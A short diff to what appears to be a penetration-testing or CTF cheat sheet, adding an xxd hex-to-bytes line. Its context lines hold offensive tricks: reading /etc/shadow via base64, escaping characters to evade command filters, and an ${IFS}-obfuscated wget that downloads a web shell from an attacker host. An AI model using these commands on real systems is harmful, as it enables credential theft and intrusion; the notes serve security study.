@@ -30,6 +30,7 @@ EOF
 xxd -r file.txt 
 base64 /etc/shadow | base64 -d
 ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
+echo "11 00 34 5f" | xxd -r -p #from bytes to letters
 
 `l\s`: Equivalent to `ls`
 `wget${IFS}http://10.8.50.72:8000/shell.php`
